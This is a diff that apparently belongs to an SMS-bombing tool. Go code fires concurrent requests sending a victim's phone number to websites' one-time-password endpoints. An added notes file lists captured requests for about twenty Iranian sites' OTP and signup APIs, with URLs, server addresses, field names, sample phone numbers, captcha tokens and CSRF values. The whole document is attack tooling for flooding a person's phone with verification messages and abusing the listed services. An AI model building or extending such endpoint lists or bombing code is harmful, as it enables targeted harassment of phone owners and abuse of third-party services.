@@ -229,9 +229,6 @@
 		go sms("https://bit24.cash/auth/api/sso/v2/users/auth/register/send-code", map[string]interface{}{
 			"mobile": phone,
 		}, ch)  // edit :4/22/2025
-		go sms("https://core.pishkhan24.ayantech.ir/webservices/core.svc/v1/LoginByOTP", map[string]interface{}{
-			"null, Username": phone,
-		}, ch)  // edit :4/22/2025
 		go sms("https://dicardo.com/sendotp", map[string]interface{}{
 			"phone": phone,
 		}, ch)  // edit :4/22/2025
@@ -1305,17 +1302,357 @@ re_token
 "03AFcWeA5fXWRX6kMEotbq1gmN89SA846-tOuDuvT24Ze-ayFyA8ZgHcf0WDV23d-BHjYkCP76fqLWMbsYyPgr0CNwyIgFlxbaiOiL2uWIniP4F2s30QTnq29Zq1tgOAx-c4JVrvH2RKkTm1U3aMrwt28MzL3jE6kPXYLdN_rz625aj7qkiUJZStqfaxEf51T8FLjRHR1ZnZjmRejpMKL1BJ6gZ8KycrtFdKPBmJsHIH6RRq657F_V4cpZ2XmKFBhvMuu8-q5DJdgEf6JYQ3IBhDNCNyhbCgHyLnK87GUypqivYMX8ymXf4uVQrP_I5fXJD7ezXsYmTi_6e0m2TwaSlqsc8hJkqeTd73-eKPxw9bezqgZYXyRZEuAnySEtrLkf6Fko0LMGpYSEZSP_gJk03OjNLpeYRZh8JLTvolPMUljfRwAsJJgGw3us2rphfCCOQiFpZoqD_riKuzffON2s9muGibGNAiXPLWyw9499W3I2uuZfHfru9wgrhDNkweMnZfmELc1gSjsESCzm-T-LgCd1kFJa9e5vLjz-sVsbe6H00tiAIgE8L_MW8zj-7bMmDHPslnedm2X2kEHX1gAeSx_LuLBxAKMQNqJnHtQyT5iJq1EOAiKP3tNa1GQTzek13lWezp_aTeucR7vhEHFWvHtJ4gyGdmRrSkrtIDsBi9QiQK46Ykj26kuQXgei7HIKZ7a4Db9bmAquCKwu5VaLhqCD9fdoS4OcCLrwB9jpSRPnufyePCTlACflRnsu-P1kLnKe8ivxYBN8njK3BbCgVt79uR0KwFs1zfD368B6u-NQw0CELiXTsJvs4bXCgMM5wnVj-kmIXb4p9zo8mS7Iwhsy5N9AujSZjtrKLsn1w4oApVG-2LSsrPkgCtl7ky1ny8gBidbc36m8qJA__GvwftaQ2BldcyqSuQ"
 
 ---------------------------------------------------------------------------------------------
+Request URL:
+https://api6.arshiyaniha.com/api/v2/client/otp/send
+Request Method:
+POST
+Status Code:
+200 OK
+Remote Address:
+185.143.232.201:443
+Referrer Policy:
+strict-origin-when-cross-origin
+
+{cellphone: "009122221212", country_code: "98"}
+cellphone
+: 
+"009122221212"
+country_code
+: 
+"98"
+---------------------------------------------------------------------------------------------
+Request URL:
+https://melix.shop/site/api/v1/user/validate
+Request Method:
+POST
+Status Code:
+200 OK
+Remote Address:
+46.245.86.30:443
+Referrer Policy:
+strict-origin-when-cross-origin
+
+{mobile: "09128887494"}
+mobile
+: 
+"09128887494"
+---------------------------------------------------------------------------------------------
+1:
+Request URL:
+https://www.delino.com/User/PreRegister
+Request Method:
+POST
+Status Code:
+200 OK
+Remote Address:
+92.61.183.140:443
+Referrer Policy:
+strict-origin-when-cross-origin
+
+mobile: 09123456456
+
+2:
+Request URL:
+https://www.delino.com/user/register
+Request Method:
+POST
+Status Code:
+200 OK
+Remote Address:
+92.61.183.140:443
+Referrer Policy:
+strict-origin-when-cross-origin
+
+mobile: 09123456456
+---------------------------------------------------------------------------------------------
+Request URL:
+https://kafegheymat.com/shop/getLoginSms
+Request Method:
+POST
+Status Code:
+201 Created
+Remote Address:
+176.120.16.110:443
+Referrer Policy:
+strict-origin-when-cross-origin
+
+{phone: "09128887464",…}
+captcha
+: 
+"03AFcWeA4FMBvFTglvqDId-tPV0darTpRSL9h1dXkoqXp73kj1ACy6DjmvXRxdJyoz9PVczFiqzVFfG03LdNu1LYA5rrsoOJA9mwDI9SsXPxkHyZdpcHHhtrdsA0vq5xqmkKV0LYijuv4vtd2CcHXsg6jDRxUVgk98IAe_m0r8g9Tluf9kayWFxgz1MGtX7HElWacnPA1oXsxGfZB8IrB_kay1FB72gUU9u2VNDOWPHVybVg9FUULo2MnJki6sdiPXoK26VFT0K5z-7HBcrmybk0hIO_1M_AUp4KQo0nLc2KaheSj99VMvnunUWIqHmWI2wbRWPfRTjNGGtu8VhXIRZ4JNgNd5hLvt3kocD3LQ_Jf5KAHYmPow4wxxxp6_8TGCEJL4LQIHgqNrFkbFndoWwdlXP2PvGP4m4AsFXQd-fJV5lVpGGTtGp2BXVbAeyK5nh6P1WzTUL2dbb3FHYLdRcp-q37SIPOKQcwRYTJPnLW13nFOMjeSsvmoDZMuzPKKr2aRoIxZvZ3utH5ex3_64q3T_2lt8N6oaHWM0PgiBZncJJEXaeNnOGUXBn9SuMD8WCWBwdBiUC-cnOI4gHqSjXT1JEFYv8vvp9qPRJx7X3d58W_kq_eidU-hipMMf4P1TM2lnYK90x8lq9TfE8u9swH6tEwF8J_tutS1N7R-f_uSAmgHXLcGi1XKSdguFDi1f4AQNrJQ3N7HCzzoRBKnITMHK69gDtaKywCPuykrlyk4pJWvoJP2nlmg-8pQ0aQneHn1vUaJozOB3u1p1gj3_q6OwqCm03hFh9DpAe8KL2Ivw7umHOU9l1vd-KGaVfWgAQFV4sRyD8CFJ9-NX_V2Za8HocT6TsPZds21K-l92FN0WQQTpW1Qc6m_bLU-m2q-qEsHnyJHZDrhyYW26qqm05lYUCn02Sba4E4Z4QMvupPGbuiNqdfHMupXoVAj-dEewFfzHeXt36tBix9ta0TO66_C3KSVso6dACg9DdXNMgopMMstm1mf_BmH6fKT1_8AK2hGCkaauM2zIOAOOjPdN0ep8GOvcrpbI_K56YLevCxrrNv3Xo1CIa8YL2RnkhOcEOGuGtQQcFagTiCRlSxZLaKjjXLvGFhb3uL14813I0dRjIivONnvqEQdddrYtuUX1F9oZ92HWU2btaqGMDicJQn3ePbZd0qPGK0cF5RczsfCOOhf2HCbcOLw8dcGOFUXgFNRnJOhLREixosBBS9K1Pzqrg28rlcZA9Ilv4H83Erite6Jr6u2pqSLfb_ky_xD7CtPHu-36bhSdfTJpkaNTukWeRbef-3fz_wVmAvbqiIRGjdpqHyd_XjzYgcEG3WOtNLEGSdD9aXSu58pNuoQkmlSi7YpfjHUD57V-F3ak9a2Kd_ycSgeF3eGE6YY8AFeakINvEtJOMuaYQmaEz9IhcXT4yWOGodBWXma-Rym7Cy2QCaHSlEvaX993e2iH5iiBpkF_jJHToHAFsPlAHEGv5rajXKciBP6Zwupew6evrB_v5-hF9PRc4zqLCyCaOIl3pwIMRZba076hdDvlny0YrzDU8gUF-3SIlKekFxRLdgT3VWIiBC9rwqJ_-qvsqUGTMtgJ6F98x__0jGjgClNpyjKWOAedpTv_cr0QlDQCrnovkoVoJSmKhRPEMIxgwUSvTxqJ5SJx7uU5VH_Naki2WLGNWQ4rqnMYpS5FC6DPbUr2K-cwfv3teoZIFJyetlzi4B20beGwgmmGuVbbLP0nKuqaqrxqGJAjtNhdyqS3NwxL21famdODBHwlHXNeVbYs2KGu7Jhw904N5umUFa-ffzHYi7wn_UNCOVJ88Yw3Nd3R0b2flfhRBBgRsOl_H0gwILK3FVYtcXmo2u2kxYhRf-s84XtIKSGOCGC10dmPbT4E2QhS8dtmTmtawCy1mfGURHAgEQNA8d-v0RAAJCeINYFyQYI0-Qtq6LHI4YlbFpTHK1JgWxkjSeSeh9HTEF9Hg1kfhyREm0pnP8piMd1oltJXv_-hBLBVCxz-1wSdD7Kz6NEa1a-uNPw"
+phone
+: 
+"09128887464"
+---------------------------------------------------------------------------------------------
+Request URL:
+https://cinematicket.org/api/v1/users/signup
+Request Method:
+POST
+Status Code:
+200 OK
+Remote Address:
+185.147.178.26:443
+Referrer Policy:
+strict-origin-when-cross-origin
+
+{phone_number: "989123456789",…}
+phone_number
+: 
+"989123456789"
+recaptcha
+: 
+"03AFcWeA48ktYi0G0a6F_XFYdcFPn6_sNvkENpqSFktoxlSKuiuyWL0dc7y6cEJjvo1jQIOpJN24wNs4-Db34_N4npgAuC0XEuMO1osEw7DxEHW2qeMlU341XBkHIwNAfiSlQe7ZbjB1OAwyZUTubZrOdmh0dogBgVKGsriSmWJG57on9U0CA_Dd6nbxaMAG5dX48JeEQf_jtcLAmAHUvwyKFVVQ5ify5GW6PH5FkMxlzOKq2C1QG2mdvHiTn2JwtxrO7XjCsPaVsAIp-RkD8liem9I3GlLJxOdJRrd38Q5Fl3-bRMK9LAqus8u4Cm60RRu3-cIpUmd7nxDVSSsW3i_yeeZLa8jS5WPx98Ez5WPFIUhOoUOae4IPE93b4aOvRGuM4V56IHvHSmycIHhNw9NyPWOFsqsHL4pHtT5zNyciC-LYRRmXOfdpeD1Uy4_mbVH8ulzZICfzeo-dg5y3zK5ecoYambcGInxAL-QqdsjFXoyemqcbyj8I8bSDGI5yFS9IYgiQIY9TZbQnrLxRj18FWybFAifVr1smlelUcVB2Zuvj4jIhrF2wVYSsxqfI6t_-Pk2xjlcXw-CzLR5BUfRkDj7FsvaIAqsN1Vu_G00q7LDj30pSarfaC58iUcoNa9reEqAk8bdu6ze5EQmPAaLFC9rqEm6_zaL4fTS4ssu9ioJa7HTzm7U5F48_djPEoNi9GsZ-ONmRa7Gf5z1GS0ZP2McTEk8sfHVvqg-23q8n3LD2gTolZgPiO1CzbMYMcjRzGveqEyaao_gNcr2V_wK9mp14P1Wd97Cv5Nq2DXOJRulYQnu4Tb7rZn-zT2FuYGBcD8uTRCqUr4yhurn_LEVqB25VKN5K1IWPypmacUxZBf1-rrom1CE4ljNIV9MRRir6cIhVVLLsQXGvnc---sgDcCq40QF5DLYD3VCmOnZjq-3J_VXPDKGEs9zKnYhdyfG-ZYC2t53UgX"
+
+---------------------------------------------------------------------------------------------
+Request URL:
+https://mobogift.com/signin
+Request Method:
+POST
+Status Code:
+200 OK
+Remote Address:
+79.127.126.104:443
+Referrer Policy:
+strict-origin-when-cross-origin
+
+destination: 1
+username: 09123456789
+captcha: 5646
+---------------------------------------------------------------------------------------------
+Request URL:
+https://api.timcheh.com/auth/otp/send
+Request Method:
+POST
+Status Code:
+200 OK
+Remote Address:
+185.143.232.201:443
+Referrer Policy:
+strict-origin-when-cross-origin
+
+{mobile: "09123456789"}
+mobile
+: 
+"09123456789"
+---------------------------------------------------------------------------------------------
+Request URL:
+https://gateway-v2.trip.ir/api/v1/totp/send-to-phone-and-email
+Request Method:
+POST
+Status Code:
+200 OK
+Remote Address:
+46.245.69.250:443
+Referrer Policy:
+strict-origin-when-cross-origin
+
+{phoneNumber: "09123456789", token: "VHJpcDg4MDkxMTQyNDkxNzQ1NzUyMjA4Mjk4"}
+phoneNumber
+: 
+"09123456789"
+token
+: 
+"VHJpcDg4MDkxMTQyNDkxNzQ1NzUyMjA4Mjk4"
+---------------------------------------------------------------------------------------------
+Request URL:
+https://beta.raghamapp.com/auth
+Request Method:
+POST
+Status Code:
+200 OK
+Remote Address:
+81.12.30.46:443
+Referrer Policy:
+strict-origin-when-cross-origin
+
+[{phone: "+989123456789"}]
+0
+: 
+{phone: "+989123456789"}
+---------------------------------------------------------------------------------------------
+Request URL:
+https://client.api.paklean.com/download
+Request Method:
+POST
+Status Code:
+200 OK
+Remote Address:
+195.211.45.136:443
+Referrer Policy:
+strict-origin-when-cross-origin
+
+tel: 09128887464
+---------------------------------------------------------------------------------------------
+Request URL:
+https://mashinbank.com/api2/users/check
+Request Method:
+POST
+Status Code:
+200 OK
+Remote Address:
+185.143.234.89:443
+Referrer Policy:
+strict-origin-when-cross-origin
+
+{mobileNumber: "09123456789"}
+mobileNumber
+: 
+"09123456789"
+---------------------------------------------------------------------------------------------
+Request URL:
+https://api.rokla.ir/user/request/otp/
+Request Method:
+POST
+Status Code:
+200 OK
+Remote Address:
+46.245.91.213:443
+Referrer Policy:
+strict-origin-when-cross-origin
+
+{mobile: "09123456789",…}
+mobile
+: 
+"09123456789"
+re_token
+: 
+"03AFcWeA6ubSlb6AbrCYYy32m7ojT-ROSibXd5FucXbywrE9sHGpvzihPqjPw0rCbOP_0L87pX8xqAGYERYrgbGv1oq8IV1fofXHQ5AR0ijV9poPuzrulCjoL9TiRthRunvV7y5Ljk41EJZGO-PKiw8l5IM_a8sczjAzQK2HalGhJAODl-t_w9r1tPAHQCcLjWzaEln0PuC_ZGT4m8pC_eu8B27ZiM6_2DaYbJkrMhVSn0FK2ovWmxpEmq5S7rJQHmgKJZzFhJjmIUc-jphwOkS7yoDO_57RfZxSk_M61k45vqe64R9K2blBznnxR_Z6dQYaJdoAEuiPAxU9FiWbUx8sj2tvq_jngXGh-8JDPg-oZqbcZtAqzluaWjDoGNQb6fyVC67i-3hX9fq1u2fm_M_cPfaF_GNt4NzvYcf7lLEyO5P18ftkxiEvKe3Fya1rznBU0BAuJBZ8VU_d0AJEG6FXqPtE3mAX5wXr_twJWlZsvt1NbdvhWXARfVLv0XnXFFlKuTBJwMHD0nRNmPqYGTbtXEC9bhRPHIE7EdRtRr0jNm4h1kzsUXCCCkhroL8iVmfAzYXky_ak_RhVGOhsSICO8GznTxXOKWklOecp34hI8kwjKx7mp8MYaom5iiCA59ZxHFq7cJh6Oe_qhzBCi7cGfcx3L-1_cTYZOLz5DgWaBLT8f_NmV_t65wYZPLIpCCrDioUs8eBHROF11nJLVsy-88VpJ-PP4F1fm47oQW_GdGA6B3oXNarMnPEwiNOiXH7Ps6J8K_hUHhfjIrjxn-DH7JHVB_ib8M1_YoY0lAzipb-YlW1QQAVJgLrR69biOk4dvo7zWt_g5lZhe3tJ7O4T62lCjWCaemyoTaQ-gnqtBeH_77lbqWb9vyqGg3E1uG5GFXiRa2ZYCyUlDrM0NW43Zy_DJbXmChqOo3DrBF-OpDvg7B9S6E0EA"
+---------------------------------------------------------------------------------------------
+Request URL:
+https://takfarsh.com/wp-admin/admin-ajax.php
+Request Method:
+POST
+Status Code:
+200 OK
+Remote Address:
+5.9.154.241:443
+Referrer Policy:
+strict-origin-when-cross-origin
 
 
+action: voorodak__submit-username
+username: 09123456789
+security: 6b19e18a87
+---------------------------------------------------------------------------------------------
+Request URL:
+https://www.offdecor.com/index.php?route=account/login/sendCode
+Request Method:
+POST
+Status Code:
+200 OK
+Remote Address:
+171.22.24.127:443
+Referrer Policy:
+strict-origin-when-cross-origin
+
+route: account/login/sendCode
+phone: 09128887464
+recaptchaToken: 03AFcWeA6jXDGUuJYbfOIbYY2eVTVQ8SVYkriVmmrwIjVj6BM0dG5bEzcA3QDPvv4iQtq0RAVg5vtdfmHPKKvTISlmiZCNJUzFC74r_SPf2PzuY6jPXRIQ42WtOQfH8D1xXBm5Q79diwrz_ieh89SIXHfFtlTwHLfjF-hAx6GdcXFGQQbgGeiow14bicwhvVw3b0aJN7eQdaiwe6VArpvtr0VR_ijzj6rvTo-EgJLCH53AUgc-VKt7zSwR_RyHjzO4FNSwr859y0IBTIlQK73QmlfFnyBMw6Sk-9R3-UN9LMNBY8z0KJBcR10__noNoT222wyzeyC796Kj9hknZVr8sPhjxVx1cRmrA52HTg18i3Ry7sNdTBbFusnAD-6kSJvHxQSUZBzHKu3F-2KAc87OB1JePzXz0J18D31lxb836fA5553dQIykD5GZCgovPVwtEIi_ym9s5w6H8LqFhjGvlOAC_MAkBwouOXYFero-fj1A0XKG134pB1GZV1FdbrGx316n2zCRkNCUpih12SfMne3XkY3maI_bXVEPKdluSpZUh94LDIbrfMWSbSJ2_mFUYWoYw8YUST-Ua98LpiQUa-xhY_2LAthPq7i8gcwN26oQi_zoUF-_0ilYN793ANxbgZF2UPdmVhwSv1Jxq-oEc3O6bHyz0-FbNeB-T7eYMjUT_9ENJca1-qdfg8E6QPnxRPCIb1dkL5OxzRnn98jr6Fxql25IXTIjQH-e22usfEea85H16XVhjKB1gQoIB29aQsYAV3tyF49h038ImHPlx7busAKcZGff5IK7eFK_reoaP6LTMZu3x4dIsHQD5FAuypdHdyaNMlwq3wow2DVcYDxi5JrlM__APy7C7BIuvo2SHpd_Y200TH9smNpvK42H5_BEJlOUK8TBOtjOiJgdgvOLDlMAQimZ6-bex20Wf1MvsJdm1gxGd4c
+
+---------------------------------------------------------------------------------------------
+1:
+Request URL:
+https://ketabchi.com/api/v1/auth/getCaptcha
+Request Method:
+GET
+Status Code:
+200 OK
+Remote Address:
+185.143.235.201:443
+Referrer Policy:
+strict-origin-when-cross-origin
+
+{captchaToken: "4f40b1fa-7d2a-43be-8736-c019bb646a3b", success: true}
+captchaToken
+: 
+"4f40b1fa-7d2a-43be-8736-c019bb646a3b"
+success
+: 
+true
+
+2:
+Request URL:
+https://ketabchi.com/api/v1/auth/requestVerificationCode
+Request Method:
+POST
+Status Code:
+200 OK
+Remote Address:
+185.143.235.201:443
+Referrer Policy:
+strict-origin-when-cross-origin
+
+{auth: {phoneNumber: "09123456789"}}
+auth
+: 
+{phoneNumber: "09123456789"}
+---------------------------------------------------------------------------------------------
+Request URL:
+https://ghasedak24.com/user/otp
+Request Method:
+POST
+Status Code:
+200 OK
+Remote Address:
+185.120.221.44:443
+Referrer Policy:
+strict-origin-when-cross-origin
 
 
+mobile: 09128887494
+---------------------------------------------------------------------------------------------
+Request URL:
+https://dicardo.com/sendotp
+Request Method:
+POST
+Status Code:
+200 OK
+Remote Address:
+104.21.45.168:443
+Referrer Policy:
+strict-origin-when-cross-origin
 
 
+csrf_dicardo_name: 0f95d8a7bfbcb67fc92181dc844ab61d
+phone: 09123456456
+type: 0
+codmoaref: 
+---------------------------------------------------------------------------------------------
+1:
+Request URL:
+https://bit24.cash/auth/api/sso/v2/users/auth/check-user-registered?country_code=98&mobile=09123456456
+Request Method:
+GET
+Status Code:
+200 OK
+Remote Address:
+104.22.48.184:443
+Referrer Policy:
+same-origin
 
+country_code: 98
+mobile: 09123456456
 
+2:
+Request URL:
+https://bit24.cash/auth/api/sso/v2/users/auth/register/send-code
+Request Method:
+POST
+Status Code:
+200 OK
+Remote Address:
+104.22.48.184:443
+Referrer Policy:
+same-origin
 
-
-
+{country_code: "98", mobile: "09123456456"}
+country_code
+: 
+"98"
+mobile
+: 
+"09123456456"
+---------------------------------------------------------------------------------------------
 
 
 
